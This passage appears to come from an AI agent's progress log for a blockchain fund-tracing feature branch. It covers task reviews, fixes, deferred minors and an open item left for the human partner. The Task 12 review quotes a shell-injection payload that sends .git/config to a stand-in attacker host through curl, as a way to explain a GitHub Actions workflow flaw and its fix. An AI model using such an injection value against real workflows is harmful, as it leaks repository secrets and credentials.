  of exactly that. The fix restores an invariant this codebase already learned
  once. Implementer disclosed it as a real behaviour change with its own test
  rather than folding it into "tests pass".
Task 11: minor (deferred): round-3 report says "two more tests" were updated in
  place where the diff shows three. Cosmetic; totals correct.
Task 11: complete (commits 936fb53ad..b808ca97f, review clean after 3 rounds,
  3 minors deferred)

Task 12: implemented (commit 9cef42f22). 537 passed in 5.99s, ruff clean across
  src/tests/scripts, workflow YAML parses. Spec ✅ but quality "Needs fixes" —
  two Important, both plan-mandated. Reviewer confirmed reset_cursors' scoping
  is exact-match (substring addresses cannot cross-contaminate, malformed keys
  err toward keeping) and the README's nested powershell fence closes correctly.
Task 12: deviation ACCEPTED — scripts/__init__.py was missing from the brief's
  git add list but required by the brief's own test import. Reviewer agreed this
  follows the brief rather than deviating from it.
Task 12: PLAN DEFECT (a), Important — SHELL INJECTION. trace.yml:35 splices
  `${{ inputs.investigate_wallet }}` directly into the run: command text. GitHub
  substitutes into the script source before any shell parses it, so the
  surrounding quotes protect nothing. A dispatch value like
  `x"; curl attacker/$(cat .git/config); echo "` executes with ETHERSCAN_API_KEY
  in scope, contents:write + issues:write, and an authenticated checkout.
  Bounded (dispatch needs write access already) but textbook. Fix: pass via env:
  and read "$VAR".
Task 12: PLAN DEFECT (b), Important — the backfill cannot finish OR resume.
  Budget falls back to the shared collection.* keys: max_calls 2500,
  time_budget_seconds 420 (7 min) against backfill.yml's 60-minute job timeout —
  an eighth of the time available, for the one job whose purpose is reading full
  history across six chains. And the wired step never passes --keep-cursors, so
  reset_cursors runs every invocation: a budget-truncated run has its cursors
  wiped and restarts from block 0, potentially forever. main() also prints only
  degraded_sources, never the per-chain `truncated` flag, so a truncated run
  exits 0 and reads as complete. Directly defeats the task's stated purpose.
Task 12: fix — dedicated `backfill` config block sized to the 60-min job;
  reset default INVERTED so resuming is default and `--reset` is explicit, wired
  to a `full_reset` workflow input; truncation reported by name.
Task 12: minor bundled — README Layout omits backfill_transfers.py though the
  chain/ line above documents the analogous src/ addition.
Task 12: fix round 1/5 (3 addressed, 0 open; commits 9cef42f22..99bc18f1c).
  545 passed, ruff clean, both YAMLs parse. Controller verified: no untrusted
  ${{ }} reaches any run: text, both inputs pass through env:, --reset replaces
  --keep-cursors, config.backfill is 20000/3300 vs collection's 2500/420.
  Re-reviewer confirmed the full_reset shell conditional FAILS CLOSED — any
  value other than exactly "true" takes the non-destructive branch — and that
  the budget fallback chain is KeyError-free by inspection at every level.
Task 12: minor (deferred, worth the final fix wave): README's "Transfer
  substrate" section documents the investigate_wallet operator path with a
  copy-pasteable command but has no equivalent walkthrough for
  full_reset/--reset, though this round added that entire operational mode and
  touched README in the same commit. Discoverable via the workflow input's
  description and the script docstring, but below the standard the sibling
  feature sets — and it is the path that answers the $13M question.
Task 12: minor (deferred): no test covers a config with BOTH `backfill` and
  `collection` absent. Provably KeyError-free by inspection; coverage gap only.
Task 12: complete (commits b808ca97f..99bc18f1c, review clean, 2 minors deferred)

=== ALL 12 TASKS COMPLETE ===
Branch feat/universal-fund-tracing, 39 commits from merge-base 0fca737f0.
545 tests passing in ~6-12s, ruff clean across src/tests/scripts.
Final whole-branch review dispatched next.

OPEN ITEM FOR THE HUMAN PARTNER (not a task defect — a plan gap):
  Nothing supplies PriceCache's fetcher, so every non-stablecoin transfer is
  value_basis "price_unavailable". Those records ARE retained in the substrate
  and counted in sweep_health.unpriced, so the gap is visible rather than
  silent — but the graph gets no ETH/WBTC/ARB edges and alert_fund_movement
  cannot fire on them. The spec called for a cached daily-close source; the plan
  never created a task to build it. Needs a free credential (CoinGecko demo) and
  belongs in its own task. Stablecoin flow, which is the bulk of this trader's
  activity, is unaffected.
